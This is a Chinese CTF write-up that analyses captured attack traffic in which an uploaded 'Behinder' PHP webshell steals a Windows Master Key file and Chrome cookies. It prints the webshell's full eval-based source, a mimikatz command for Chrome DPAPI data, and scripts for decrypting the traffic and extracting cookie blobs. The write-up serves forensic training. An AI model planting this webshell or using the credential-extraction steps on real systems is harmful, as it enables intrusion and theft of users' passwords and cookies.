原创： gtfly 合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

预备知识

“冰蝎”php一句话木马分析

“冰蝎”是什么？它是一款动态二进制加密网站管理客户端，它可以在HTTP明文协议中建立加密隧道，可以用于躲避传统的WAF、IDS等设备的检测。项目地址：

https://github.com/rebeyond/Behinder

“冰蝎”一句话木马可由Java、php、.net等语言来实现，我们以php为例来看这种新型的php一句话木马的实现：

<?php@error_reporting(0);session_start();//如果接收到pass参数，则会生成16位的随机秘钥，存储到session中if
(isset($_GET['pass'])){ $key=substr(md5(uniqid(rand())),16);
$_SESSION['k']=$key; print $key;}//如果没接收到pass参数，则利用存储到session的秘钥进行解密else{
$key=$_SESSION['k']; //接收POST来的加密后的待执行命令
$post=file_get_contents("php://input"); //如果不能加载openssl扩展，则使用base64解码
if(!extension_loaded('openssl')) { $t="base64_"."decode"; $post=$t($post."");
for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; } }
//使用openssl进行AES解密 else { $post=openssl_decrypt($post, "AES128", $key); } /*
将解密后的$Ppost以`|`分割为数组；例如$post为assert|eval('phpinfo();')，那么分割后为: array("assert",
"eval('phpinfo();')") */ $arr=explode('|',$post); $func=$arr[0];
$params=$arr[1]; class C{public function __construct($p) {eval($p."");}}
//创建C类，利用__construct中的eval来执行解密后的值 @new C($params);}?>

离线导出Chrome浏览器中保存的密码

DPAPI，Data Protection Application Programming
Interface，是Windows系统的一个数据保护接口，主要用于保护加密的数据。Chrome使用DPAPI保存了我们的登录密码和cookie值

用户使用Chrome访问网站进行登录时，可以选择是否保存密码。当选择保存密码时，Chrome先将密码进行加密，再保存在SQLite数据库文件中，数据库文件路径位于：

%LocalAppData%\Google\Chrome\User Data\Default\Login Data

同上，保存Cookie时，数据库文件路径为：

%LocalAppData%\Google\Chrome\User Data\Default\Cookies

存储的cookie值被加密为DPAPI blob来进行保护；我们可以通过使用Mimikatz这个工具来对Chrome中的SQLite数据库进行解析：

mimikatz dpapi::chrome /in:'%LocalAppData%\Google\Chrome\User
Data\Default\Cookies'

解密DPAPI blob用到的相关概念：

  * DPAPI blob：一段密文，可以使用Master Key对其解密  

  * Master Key：64字节，用于解密DPAPI blob；使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中  

  * Master Key file：二进制文件，可以使用用户登录密码对其解密，得到Master Key  

得到DPAPI blob、Master Key file和用户登录密码后，便可通过Windows Password Recovery这个工具解密Master
Key file得到Master Key，再通过Master Key解密DPAPI blob，从而获得明文。详细DPAPI的介绍可参考文末文章。

3CTF复赛“这是捕获的黑客攻击数据包”流量分析

用Wireshark打开后，首先看其http流量，发现主要对upload.php、upload/20190918/file_5d81f9f4d22d41.67475082.php这两个php页面进行了请求：

![v2-104fc8526243970f31bcf82e6a68ea0c_hd.j](https://pic1.zhimg.com/80/v2-104fc8526243970f31bcf82e6a68ea0c_hd.jpg)

右键，追踪upload.php的tcp流，发现其向upload.php上传了一个shell.php文件，内容为上面的“冰蝎”一句话木马：

![v2-ded0c3a385c9601f81ea44a7f0d6632b_hd.j](https://pic1.zhimg.com/80/v2-ded0c3a385c9601f81ea44a7f0d6632b_hd.jpg)

上传后，服务器端返回了上传成功后的文件路径：

![v2-9ea841af1c88a6dc3ef6ca4c261d8cba_hd.j](https://pic4.zhimg.com/80/v2-9ea841af1c88a6dc3ef6ca4c261d8cba_hd.jpg)

接着，追踪upload/20190918/file_5d81f9f4d22d41.67475082.php的tcp流：

![v2-3737730e5b4c0b8ce5656f17c5a27904_hd.j](https://pic1.zhimg.com/80/v2-3737730e5b4c0b8ce5656f17c5a27904_hd.jpg)

可以看到，其分别用?pass=257和?pass=790进行了请求，服务端返回了生成的秘钥和session名称；其对应信息：

参数 Cookie 秘钥pass=257 PHPSESSID=3ctuh22vtilpn6dmhfiretvve8
23125af46e7c5a1fpass=790 PHPSESSID=hie9ignjc1393vr719m0n38872 d59042be6e437849

在当前页面搜索pass=257请求时返回的session名称，发现只有生成返回时出现了一次，其他的请求使用的都是pass=790请求时返回的session名称，那么可以知道其他请求所带的加密信息的解密秘钥为d59042be6e437849：

![v2-be4e54ddae4ec33d94baf1a452295c8d_hd.j](https://pic1.zhimg.com/80/v2-be4e54ddae4ec33d94baf1a452295c8d_hd.jpg)

之后，将这些请求信息解密，步骤：

在Wireshark选择 文件->导出对象->http:

![v2-57fc409e33e7c741550795c369a5b9ba_hd.j](https://pic4.zhimg.com/80/v2-57fc409e33e7c741550795c369a5b9ba_hd.jpg)

得到文件如下：

![v2-f31564eb11943740760a01412afb1667_hd.j](https://pic4.zhimg.com/80/v2-f31564eb11943740760a01412afb1667_hd.jpg)

其中，file_5d81f9f4d22d41.67475082(*).php内容均为客户端发送的加密的字符串。写脚本批量解密：

<?php $key = 'd59042be6e437849'; for($i=1;i<=39;$i++){ //$post =
file_get_contents('/home/gtfly/下载/file_5d81f9f4d22d41.67475082.php'); $post =
file_get_contents('/home/gtfly/下载/file_5d81f9f4d22d41.67475082('."$i".').php');
$post=openssl_decrypt($post, "AES128", $key); $arr=explode('|',$post);
$func=$arr[0]; $params=$arr[1]; $params = preg_replace('/eval/', 'echo',
$params); eval($params); }?>

得到的php代码都很类似，目的都是获取目标主机上的特定文件内容：

![v2-9c50fc2f06ab9d88853d95677dad9902_hd.j](https://pic3.zhimg.com/80/v2-9c50fc2f06ab9d88853d95677dad9902_hd.jpg)

最后一行，路径格式为Master Key file的格式：

![v2-78f526dd067177c272de15aadbd34fcf_hd.j](https://pic1.zhimg.com/80/v2-78f526dd067177c272de15aadbd34fcf_hd.jpg)

C:/Users/shadow/AppData/Roaming/Microsoft/Protect/S-1-5-21-2127750816-4215895028-2373289296-1001/6ecf76bd-1803-437e-92e6-28dd36c907aa

找到其解密前的内容，搜索含有此内容的数据包，查看对应的服务端返回的内容：

![v2-67083c941996f6d1f023550330df7b7d_hd.j](https://pic4.zhimg.com/80/v2-67083c941996f6d1f023550330df7b7d_hd.jpg)

可以看到里面含有Master Key file的名字，先将其保存下来

继续看解密得到的内容，在Master Key file上面发现有个文件名为password.txt：

![v2-4fc509230981369d8fcfa66cab3d5e66_hd.j](https://pic3.zhimg.com/80/v2-4fc509230981369d8fcfa66cab3d5e66_hd.jpg)

找到其加密字符串的位置(最后一次对话)，解密其对应的服务端返回的字符串：

![v2-a6cdf7bc63ed136425d9c85864cb46ee_hd.j](https://pic3.zhimg.com/80/v2-a6cdf7bc63ed136425d9c85864cb46ee_hd.jpg)

<?php$key = 'd59042be6e437849';$post =
'dMbFVmyUlb8MNJR1iwAN6n0CrkPTl/pfedppzkLxWWzQvkhWqXgA6UMbiqkE0LNg';
$post=openssl_decrypt($post, "AES128", $key);
$arr=explode('|',$post);$func=$arr[0];$params=$arr[1]; var_dump($arr);

base64解码，得到p@ssw0rd

解密的内容中，还有个路径为C:/Users/shadow/AppData/Local/Google/Chrome/User
Data/Default/Cookies，根据对应的密文追踪流，发现服务器返回了SQLite3数据库的数据：

![v2-e249317189a1ba997e56968b24ea4ef3_hd.j](https://pic4.zhimg.com/80/v2-e249317189a1ba997e56968b24ea4ef3_hd.jpg)

将其导出，步骤：

显示和保存数据设为原始数据，保存为文件sss

![v2-db5162d39a56745e6052c84220032bc3_hd.j](https://pic1.zhimg.com/80/v2-db5162d39a56745e6052c84220032bc3_hd.jpg)

binwalk查看其隐藏的文件类型，可以看到其识别出了SQLite3数据库：

![v2-4d2f10c6e22c2ac2b297ffc18f6ac1b5_hd.j](https://pic2.zhimg.com/80/v2-4d2f10c6e22c2ac2b297ffc18f6ac1b5_hd.jpg)

dd将数据库分割开：

![v2-a30489fa1c5ce5abf7e0fb2a3344590d_hd.j](https://pic1.zhimg.com/80/v2-a30489fa1c5ce5abf7e0fb2a3344590d_hd.jpg)

进入数据库，查看其内容和字段信息：

![v2-8280c83fe9c68f4192ab16bb42d77fcb_hd.j](https://pic2.zhimg.com/80/v2-8280c83fe9c68f4192ab16bb42d77fcb_hd.jpg)

可以看到，cookies表中有个encrypted_value BLOB字段，将其导出：

from os import getenvimport sqlite3import binasciiconn =
sqlite3.connect("ggg.db")cursor = conn.cursor()cursor.execute('select
encrypted_value BLOB from cookies') # 导出encrypted_value BLO字段for result in
cursor.fetchall(): print(result) print (binascii.b2a_hex(result[0])) f =
open('save.txt', 'wb') # 保存为save.txt f.write(result[0]) f.close()

那么目前我们获得的信息：

DPAPI blobMaster Key filepassword

则可推测password.txt存储的是用户登录密码，使用这个密码对Master Key file解密得到Master Key，即可利用Master
Key对数据库中的DPAPI blob解密

Master Key file保存时格式要如下(保存Wireshark中的流量时，要去除不属于这个文件的内容，可参考电脑自带的Master Key
file文件内容)，否则Windows Password Recovery不能成功打开：

![v2-212a54ecb802abe968570967aa0464f0_hd.j](https://pic4.zhimg.com/80/v2-212a54ecb802abe968570967aa0464f0_hd.jpg)

之后要将其命名为上面解密得到的Master Key file文件名：

6ecf76bd-1803-437e-92e6-28dd36c907aa

打开Windows Password Recovery，选择Utils->DPAPI Decoder and Analyser->Decrypt DPAPI
data blob：

![v2-7238f066de1bf54e30eada0456742c64_hd.j](https://pic4.zhimg.com/80/v2-7238f066de1bf54e30eada0456742c64_hd.jpg)

选择DPAPI blob file为save.txt，即保存的cookies表中的encrypted_value BLOB字段的值：

![v2-1f4a5bdf283b8285eae327cf447a337b_hd.j](https://pic4.zhimg.com/80/v2-1f4a5bdf283b8285eae327cf447a337b_hd.jpg)

之后选择Master Key file6ecf76bd-1803-437e-92e6-28dd36c907aa，最后输入User SID，即Master
Key
file前的路径名S-1-5-21-2127750816-4215895028-2373289296-1001，和用户登录密码，即上面得到的p@ssw0rd

![v2-67e84a77920006115362811cd26cd84f_hd.j](https://pic1.zhimg.com/80/v2-67e84a77920006115362811cd26cd84f_hd.jpg)

得到解密后的结果，即flag：

![v2-32e21574111a36bc7a223a2d191c2787_hd.j](https://pic2.zhimg.com/80/v2-32e21574111a36bc7a223a2d191c2787_hd.jpg)

其他

题目文件：

链接：https://pan.baidu.com/s/1AQcldQ_WkcghKigK83ndZQ 提取码：tirm
复制这段内容后打开百度网盘手机App，操作更方便哦

参考文章：

https://bbs.pediy.com/thread-247634-1.htm

https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/

实验：恶意流量分析：

[课程:恶意流量分析(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=CCID9012-d1c7-459f-a4f1-da5898cc13bd)

（带领大家走进分析网络流量的大门）

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

